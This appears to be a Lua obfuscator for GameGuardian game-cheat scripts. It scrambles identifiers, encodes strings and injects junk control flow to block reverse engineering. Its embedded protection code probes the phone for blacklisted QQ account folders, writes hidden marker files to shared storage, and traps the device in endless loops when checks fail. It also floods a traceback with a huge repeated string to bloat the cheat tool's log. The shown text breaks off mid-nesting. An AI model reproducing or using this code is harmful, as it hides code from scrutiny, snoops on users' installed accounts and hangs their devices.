--BY.Mt source
--原xs
--防反
function yxnd()
lmn={"A", "B", "C", "D", "E", "F", "G", "H", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "c", "b", "e", "d", "g", "h", "f", "k", "m", "i", "l", "o", "q", "p", "n", "t", "u", "r", "z", "s", "y", "x", "v", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"}
local x=math.random(1,49)
local z=math.random(4,7)
local w=""
for i=1,z do
local d=math.random(1,59)
w=w..lmn[d]
end
return lmn[x]..w
end



function sjhxsf()
local sj=yxnd()
local sj2=yxnd()
local sj3=yxnd()
ssy="if nil then gg.setValues() local "..sj.." = {}  gg("..sj..")  "..sj.."["..sj.."["..sj.."]] = gg local G_="..sj.." if G_ then local "..sj.." = {} gg() gg("..sj..") "..sj.."["..sj.."["..sj.."]] = gg else prompt() local "..sj.."={} "..sj.."("..sj..") goto "..sj2.." "..sj.."["..sj.."["..sj.."]] = gg end "..sj.." = gg ::"..sj2..":: end if nil then gg.setValues() local "..sj3.."={} local "..sj.." = {} choice("..sj..".s2) "..sj.."["..sj.."["..sj.."]] = gg local G_="..sj.." end "
return ssy
end



YxMaxhx="if(nil)then;local sdzfns = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #sdzfns[-nil%nil%-nil] ~= nil then;sdzfns[-nil%nil%-nil] = sdzfns[-nil%nil%nil]()sdfnz[-nil%-nil]();end;::RNX::;sdzfns[-nil%nil%-nil] = sdzfns[-nil%nil%nil]();goto RNX;sdzfns = nil;end;for i = 1, 0 do;local sdzfns = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #sdzfns[-nil%nil%-nil] ~= nil then;sdzfns[-nil%nil%-nil] = sdzfns[-nil%nil%nil]()sdfnz[-nil%-nil]();end;::RNX::;sdzfns[-nil%nil%-nil] = sdzfns[-nil%nil%nil]();goto RNX;sdzfns = nil;end"
YxMax=" "..sjhxsf().." if(nil)then;if(true)then;gg(nil);end;end;if(nil)then;if(true)then;gg(nil);end;end;if(nil)then;if(true)then;gg(nil);end;end;if(nil)then;if(true)then;gg(nil);end;end;if(nil)then;if(true)then;gg(nil);end;end;if(nil)then;if(true)then;gg(nil);end;end; "..YxMaxhx.." "..sjhxsf().." "
Ff=" Yxs={Yxsjh} Yxs = {} for i, v in pairs(Yxs) do Yxs[i] = v end Yxs.io = {} Yxs.gg = {} Yxs.string = {} for i, v in pairs(io) do Yxs.io[i] = v end for i, v in pairs(string) do Yxs.string[i] = v end for i, v in pairs(gg) do Yxs.gg[i] = v end YxsZ = {} YxsZ.info = {}	for i, v in ipairs(YxsZ.info) do YxsZ[YxsZ.setsList[i]] = v end g={} for index,value in pairs(g) do return value end if nil then goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X ::X:: end "
local y2=[[##🇧 🇾➨🇲 🇹 🇾™️##]]
y2=#y2


--混淆区
function sjdy(ym)
ym=ym:gsub("gg.searchNumber",Ff.."\nlocal __Yx=gg.searchNumber")
ym=ym:gsub("gg.editAll",Ff.."\nlocal __Yx=gg.editAll")
ym=ym:gsub("gg.toast",Ff.."\nlocal __Yx=gg.toast")
ym=ym:gsub("gg.setRanges",Ff.."\nlocal __Yx=gg.setRanges")
ym=ym:gsub("%-%-%[%[.-%]%]","")
ym=ym:gsub("%-%-[^\n]+","")
ym=ym:gsub("gg.setRanges%(16384%)","gg.setRanges(gg.REGION_CODE_APP)")
ym=ym:gsub("gg.setRanges%(4%)","gg.setRanges(gg.REGION_C_ALLOC)")
ym=ym:gsub("gg.setRanges%(32%)","gg.setRanges(gg.REGION_ANONYMOUS)")
ym=ym:gsub("\\n","\n")


for s in string.gmatch(ym, "function -(%w-)%(") do
yx1=yxsj(math.random(7,15))ym=ym:gsub(s.."%(",yx1.."(")
end

for s in string.gmatch(ym, "([A-Za-z_][%w]- -)=[^=]") do
 if string.find(s,"local")~=nil then
  yx2=yxsj(math.random(7,15))ym=ym:gsub(s,yx2)
  end 
  end
  for s in string.gmatch(ym, "([A-Za-z_][%w]-)=[^=]") do
  if string.find(s,"local")~=nil then
   yx3=yxsj(math.random(7,15)) 
   ym=ym:gsub(s,yx3) 
   end 
end 
return ym 
end


--防反
function yxsj(a)
lmn={"A", "B", "C", "D", "E", "F", "G", "H", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "c", "b", "e", "d", "g", "h", "f", "k", "m", "i", "l", "o", "q", "p", "n", "t", "u", "r", "z", "s", "y", "x", "v"}
local w=""
for i=1,a do
local d=math.random(1,49)
w=w..lmn[d]
end
return w
end

function sj()
s=math.random(1,10)
return s
end
function random()
m={1,2,3,4,5,6,7,8,9,0}
ya=(m[sj()]+m[sj()]-m[sj()])
if ya<=0 then ya=ya+sj() end
return ya
end

function jmsf(cs)
res=''
for p=1,#cs do 
b=math.random(1800,5400)
a=(cs[p])*b
c=math.random(555555,999999)
a=a+c
a="{"..a..",{"..c..","..b..",[\"Yx\"]={function() local Yx = {} local Y = {} Y[\"Yxnb\"] = Yx[\"YxNb\"] Y[\"YxYx\"] = Y[\"YxYx\"]:gsub(\"Yx\",\"nb\") if nil then end if false then end for o=1,0 do _() local _={} _._=_ _._=_._ _._={} for o in (_) do _[_]=_ end _() goto _ goto _ goto _ goto _ goto _ goto _ goto _ goto _ goto _  ::_:: local o={(__~__)|nil} if o.o==o.o then o.o=o.o() end end  end}}}"
res=res..a..","
end
return "{"..res.."}"
end

function yxynb(x)
y1=random()
local k='"'
  local ii=k.."(.-)"..k
  axz=""
for i in x:gmatch(ii) do
   i = "{" .. table.concat({i:byte(0, -1)}, ",") .. "}"
   sf=yxsj(#i)
   sfa="{" .. table.concat({sf:byte(0, -1)}, ",") .. "}"
   pcall(load("sfb="..sfa))
   pcall(load("ia="..i))
   bq={}
   for v=1,#ia do
   if yjc==1 then 
   bq[v]=ia[v]+sfb[v]+y1+y2
   end
   end
   i=jmsf(bq)
   yxp=yxnd()
   axz=axz.."function ___________Yx."..yxp.."()\nlocal _________Yx=\""..sf.."\" \n local ______________Yx="..i.." return ______________Yx,_________Yx end\n"
    x = x:gsub(ii, "_______Yx(___________Yx."..yxp.."())", 1)
end
yb=""
YxUI="Y".."x".."5"..".".."8"
if not hxts then
hxts=5000
end
for g=1,10*(hxts/12) do
    yb=yb.." � "..YxUI
end
Yx_UI=yb:rep(5)
sf='local y1='..y1..' local y2,y3=[[##🇧 🇾➨🇲 🇹 🇾™️##]],[['..Yx_UI..']] local Yx5_8=(function() local Yx5_8=0 NewTime=os.clock() local function Yi_Chen(code)local data ={} for i=1,#code do data[i]=utf8.char(code[i][1]+code[i][2][1]-code[i][2][2]) end return table.concat(data,"") end '..YxMax..' local function _____________Yx(x,key)'..YxMax..'keys="{"..Yxjstable({key:byte(0, -1)}, ",").."}"'..YxMax..'Yxjazsj("keys="..keys)()'..YxMax..'local data={}'..YxMax..'for i=1,#x do'..YxMax..'data[i]=Yxjsbyte(x[i]-keys[i]-y1-#y2)'..YxMax..'end'..YxMax..'return Yxjstable(data,"") end'..YxMax..'local function _______Yx(yxsf,key)'..YxMax..'local data ={}'..YxMax..'for i=1,#yxsf do'..YxMax..'local yxjs=yxsf[i][1]'..YxMax..'local yxbjs=yxsf[i][2][1]'..YxMax..'local yxjfjs=yxjs-yxbjs'..YxMax..'local yxbcs=yxsf[i][2][2]'..YxMax..'local yxcfjs=yxjfjs/yxbcs'..YxMax..'data[i]=yxcfjs'..YxMax..'end '..YxMax..'return _____________Yx(data,key) end '..YxMax..' local __________Yx={}'..YxMax..'for i, v in pairs(gg) do'..YxMax..'table.insert(__________Yx, gg[i])'..YxMax..'__________Yx[i]=gg[i]'..YxMax..'end'..YxMax..'local ________Yx={}'..YxMax..'for i, v in pairs(io) do'..YxMax..'table.insert(________Yx, io[i])'..YxMax..'________Yx[i]=io[i]'..YxMax..'end'..YxMax..'local ______Yx={}'..YxMax..'for i, v in pairs(os) do'..YxMax..'table.insert(______Yx, os[i])'..YxMax..'______Yx[i]=os[i]'..YxMax..'end'..YxMax..'local ____Yx={}'..YxMax..'for i, v in pairs(string) do'..YxMax..'table.insert(____Yx, string[i])'..YxMax..'____Yx[i]=string[i]'..YxMax..'end'..YxMax..'Yxjazsj=load'..YxMax..'Yxjsbyte=____Yx["char"]'..YxMax..'Yxjstable=table.concat'..YxMax..'local ___________Yx={}'..YxMax..'\n'
return axz,x
end
--防出源
hxdc=" if nil then goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X ::X::end "    
hxhx=" if nil then goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X goto X ::X::end  "  
hxhx1=hxhx..hxhx..hxhx  hx2=hxhx1..hxhx1..hxhx1   
Yx="♢".."□".."○".."♡".."△"   
WD=" ::S:: if(nil)then goto S goto S goto S goto S goto S goto S goto S goto S else while(true) do while(true) do break end break end if(nil)then _() local _={} _._=_ _._=_._ _._={} for i in (_) do _[_]=_ end _() goto S goto S goto S goto S goto S goto S goto S goto S end end "  
Yax1='local function M_m(arr,keystr) local v if nil then gg.setValues() local YAX = {}  gg(YAX)  YAX[YAX[YAX]] = gg local G_=YAX if G_ then local YAX = {} gg() gg(YAX) YAX[YAX[YAX]] = gg else prompt() local YAX={} YAX(YAX) goto gU51yN YAX[YAX[YAX]] = gg end YAX = gg ::gU51yN:: end if nil then gg.setValues() local tick={} local YAX = {} choice(YAX.s2) YAX[YAX[YAX]] = gg local G_=YAX end local vv=arr[1] if nil then gg.setValues() local tick={} local YAX = {} choice(YAX.s3) YAX[YAX[YAX]] = gg local G_=YAX end if nil then if true then gg.setValues() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg else local YAX = {} gg() gg(YAX) YAX[YAX[YAX]] = gg goto wJ84eS if nil then seas() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg else setvalue() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg goto wJ84eS end getnum2() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg ::wJ84eS:: end end local vvv="" if nil then gg.setValues() local YAX = {}  gg(YAX)  YAX[YAX[YAX]] = gg local G_=YAX if G_ then local YAX = {} gg() gg(YAX) YAX[YAX[YAX]] = gg else prompt() local YAX={} YAX(YAX) goto fF85oW YAX[YAX[YAX]] = gg end YAX = gg ::fF85oW:: end if nil then if true then gg.setValues() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg else local YAX = {} gg() gg(YAX) YAX[YAX[YAX]] = gg goto iK66oO if nil then seas() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg else setvalue() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg goto iK66oO end getnum2() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg ::iK66oO:: end end local mxisea=#arr%2 if nil then gg.setValues() local tick={} local YAX = {} choice(YAX.s7) YAX[YAX[YAX]] = gg local G_=YAX end if nil then if true then gg.setValues() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg else local YAX = {} gg() gg(YAX) YAX[YAX[YAX]] = gg goto uD38wR if nil then seas() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg else setvalue() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg goto uD38wR end getnum2() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg ::uD38wR:: end end local sear=0 if nil then if true then gg.setValues() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg else local YAX = {} gg() gg(YAX) YAX[YAX[YAX]] = gg goto eD09eS if nil then seas() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg else setvalue() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg goto eD09eS end getnum2() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg ::eD09eS:: end end if nil then if true then gg.setValues() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg else local YAX = {} gg() gg(YAX) YAX[YAX[YAX]] = gg goto gC110bL if nil then seas() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg else setvalue() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg goto gC110bL end getnum2() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg ::gC110bL:: end end local keystrarr={keystr:byte(0,-1)} if nil then gg.setValues() local YAX = {}  gg(YAX)  YAX[YAX[YAX]] = gg local G_=YAX if G_ then local YAX = {} gg() gg(YAX) YAX[YAX[YAX]] = gg else prompt() local YAX={} YAX(YAX) goto lF311uK YAX[YAX[YAX]] = gg end YAX = gg ::lF311uK:: end if nil then if true then gg.setValues() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg else local YAX = {} gg() gg(YAX) YAX[YAX[YAX]] = gg goto yV012xA if nil then seas() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg else setvalue() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg goto yV012xA end getnum2() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg ::yV012xA:: end end for v=2,#arr do sear=sear==#Searr and 1 or sear+1 if sear==0 then sear=1 end if mxisea~=0 then vbc=arr[v]+vv-keystrarr[v-1] if nil then gg.setValues() local YAX = {}  gg(YAX)  YAX[YAX[YAX]] = gg local G_=YAX if G_ then local YAX = {} gg() gg(YAX) YAX[YAX[YAX]] = gg else prompt() local YAX={} YAX(YAX) goto jO513jC YAX[YAX[YAX]] = gg end YAX = gg ::jO513jC:: end if nil then gg.setValues() local tick={} local YAX = {} choice(YAX.s14) YAX[YAX[YAX]] = gg local G_=YAX end else vbc=arr[v]-vv+keystrarr[v-1] if nil then if true then gg.setValues() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg else local YAX = {} gg() gg(YAX) YAX[YAX[YAX]] = gg goto lU315dC if nil then seas() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg else setvalue() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg goto lU315dC end getnum2() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg ::lU315dC:: end end if nil then if true then gg.setValues() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg else local YAX = {} gg() gg(YAX) YAX[YAX[YAX]] = gg goto dJ316sT if nil then seas() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg else setvalue() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg goto dJ316sT end getnum2() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg ::dJ316sT:: end end  end vbc=vbc-Searr[sear] if nil then gg.setValues() local YAX = {}  gg(YAX)  YAX[YAX[YAX]] = gg local G_=YAX if G_ then local YAX = {} gg() gg(YAX) YAX[YAX[YAX]] = gg else prompt() local YAX={} YAX(YAX) goto jU317uW YAX[YAX[YAX]] = gg end YAX = gg ::jU317uW:: end if nil then if true then gg.setValues() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg else local YAX = {} gg() gg(YAX) YAX[YAX[YAX]] = gg goto mM118bF if nil then seas() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg else setvalue() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg goto mM118bF end getnum2() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg ::mM118bF:: end end vvv=vvv..string.char(vbc) if nil then if true then gg.setValues() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg else local YAX = {} gg() gg(YAX) YAX[YAX[YAX]] = gg goto nC719qN if nil then seas() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg else setvalue() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg goto nC719qN end getnum2() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg ::nC719qN:: end end if nil then if true then gg.setValues() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg else local YAX = {} gg() gg(YAX) YAX[YAX[YAX]] = gg goto nG020iG if nil then seas() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg else setvalue() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg goto nG020iG end getnum2() local YAX = {} gg(YAX) YAX[YAX[YAX]] = gg ::nG020iG:: end end end return vvv end '
fy=[=[

--黑名单
local Table_QQ={
2960895570,--这里写QQ号
}
for k,v in pairs(Table_QQ) do    
local panduan=os.rename("/storage/emulated/0/Android/data/com.tencent.mobileqq/Tencent/MobileQQ/"..v,"/storage/emulated/0/Android/data/com.tencent.mobileqq/Tencent/MobileQQ/"..v)
while not not panduan and panduan do
print("by XY5.2")
os.exit()
print("by XY5.2")
XYNB()
end
end
--防修改器log刷内存
local zx="i1.dl" local zx=io.open("/storage/emulated/0/Android/"..zx,"r") if zx == nil then local zx=gg.alert("请选择","载入","退出") if zx == 1 then gg.toast"载入中…" for i=0.01,100 do gg.toast("加载中…") end local zx="i1.dl" local zx=io.open("/storage/emulated/0/Android/"..zx,"w") zx:write("884800888848004808848008888888585888888888888888888888888888808884800848008884808888888888888084800884800123451538848080461988888488888884800938848004884800619193884800434884800") zx:close() local zx="i1..dl" local zx=io.open("/storage/emulated/0/Android/"..zx,"w") zx:write("88488888888888464646949468888888888888818613161664888888884664646461661888888881643313188888888343431688888888433488888886134888888888861318888888861316888888831316888888888313131388888888433434688888883434343888888881331348888888800") zx:close() local zx="i1...dl" local zx=io.open("/storage/emulated/0/Android/"..zx,"w") zx:write("8848123884812388481238848888888881848484848818188184818188181818188181818181881818181881818188181818188181818188181818181881828288282828281881818181818188181818188181818188181") zx:close() local zx="i1....dl" local zx=io.open("/storage/emulated/0/Android/"..zx,"w") zx:write("8484884848484884848488484848488484848484884848484884848488488484848488484848484848484884848484848488484848484884848484848484848848484848484848488484848484848484848484884848484848488") zx:close() local zx="i1.....dl" local zx=io.open("/storage/emulated/0/Android/"..zx,"w") zx:write("8848") zx:close() local zx="i1......dl" local zx=io.open("/storage/emulated/0/Android/"..zx,"w") zx:write("8848") zx:close() local zx="i1..........dl" local zx=io.open("/storage/emulated/0/Android/"..zx,"w") zx:write("8848") zx:close() local zx="i1..............dl" local zx=io.open("/storage/emulated/0/Android/"..zx,"w") zx:write("8848") zx:close() local zx="i1............. ...dl" local zx=io.open("/storage/emulated/0/Android/"..zx,"w") zx:write("8848") zx:close() else while true do ::a:: gg.toast("") ::b:: goto a  gg.processKill() gg.setVisible(true) 	os.exit(x) 	end goto zxzx ::zxzx:: goto zxzx end else local i1="i1.dl" local i1=io.open("/storage/emulated/0/Android/"..i1,"r") local i1=i1:read("*a") local i11="i1..dl" local i11=io.open("/storage/emulated/0/Android/"..i11,"r") local i11=i11:read("*a") local i12="i1...dl" local i12=io.open("/storage/emulated/0/Android/"..i12,"r") local i12=i12:read("*a") local i13="i1....dl" local i13=io.open("/storage/emulated/0/Android/"..i13,"r") local i13=i13:read("*a") local i14="i1.....dl" local i14=io.open("/storage/emulated/0/Android/"..i14,"r") local i14=i14:read("*a") if i14-27607+i14*i14 == 78268345 then else while true do ::a:: gg.toast("") ::b:: goto a  gg.processKill() gg.setVisible(true) 	os.exit(x) 	end goto ZXZX ::ZXZX:: goto ZXZX end end local zx="ُ̓҉̸ًٌٌٍٍَُِِ̛̻̱̟̯̭̉ͨ͑͋͠" local zx= string.rep(zx, 99999) for i=1,10 do string.gsub(debug.traceback(zx),gg.getFile(),i) end for i=0.01,100 do gg.toast("加载中…") end gg.setVisible(true)
local WY1564504663=function ()
local WY1564504664=function ()
local WY1564504665=function ()
local WY1564504666=function ()
local WY1564504667=function ()
local WY1564504668=function ()
local WY1564504669=function ()
local WY1564504670=function ()
local WY1564504671=function ()
local WY1564504672=function ()
local WY1564504673=function ()
local WY1564504674=function ()
local WY1564504675=function ()
local WY1564504676=function ()
local WY1564504677=function ()
local WY1564504678=function ()
local WY1564504679=function ()
local WY1564504680=function ()
local WY1564504681=function ()
local WY1564504682=function ()
local WY1564504683=function ()
local WY1564504684=function ()
local WY1564504685=function ()
local WY1564504686=function ()
local WY1564504687=function ()
local WY1564504688=function ()
local WY1564504689=function ()
local WY1564504690=function ()
local WY1564504691=function ()
local WY1564504692=function ()
local WY1564504693=function ()
local WY1564504694=function ()
local WY1564504695=function ()
local WY1564504696=function ()
local WY1564504697=function ()
local WY1564504698=function ()
local WY1564504699=function ()
local WY1564504700=function ()
local WY1564504701=function ()
local WY1564504702=function ()
local WY1564504703=function ()
local WY1564504704=function ()
local WY1564504705=function ()
local WY1564504706=function ()
local WY1564504707=function ()
local WY1564504708=function ()
local WY1564504709=function ()
local WY1564504710=function ()
local WY1564504711=function ()
local WY1564504712=function ()
local WY1564504713=function ()
local WY1564504714=function ()
local WY1564504715=function ()
local WY1564504716=function ()
local WY1564504717=function ()
local WY1564504718=function ()
local WY1564504719=function ()
local WY1564504720=function ()
local WY1564504721=function ()
local WY1564504722=function ()
local WY1564504723=function ()
local WY1564504724=function ()
local WY1564504725=function ()
local WY1564504726=function ()
local WY1564504727=function ()
local WY1564504728=function ()
local WY1564504729=function ()
local WY1564504730=function ()
local WY1564504731=function ()
local WY1564504732=function ()
local WY1564504733=function ()
local WY1564504734=function ()
local WY1564504735=function ()
local WY1564504736=function ()
local WY1564504737=function ()
local WY1564504738=function ()
local WY1564504739=function ()
local WY1564504740=function ()
local WY1564504741=function ()
local WY1564504742=function ()
if(nil)then
if(true)then
else
goto sw7
end
if(nil)then
else
goto sw7
end
if(nil)then
else
goto sw7
end
::sw7::
end
if(nil)then
if(true)then
else
goto hm9
end
if(nil)then
else
goto hm9
end
if(nil)then
else
goto hm9
end
::hm9::
end
if nil then
local load={}
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
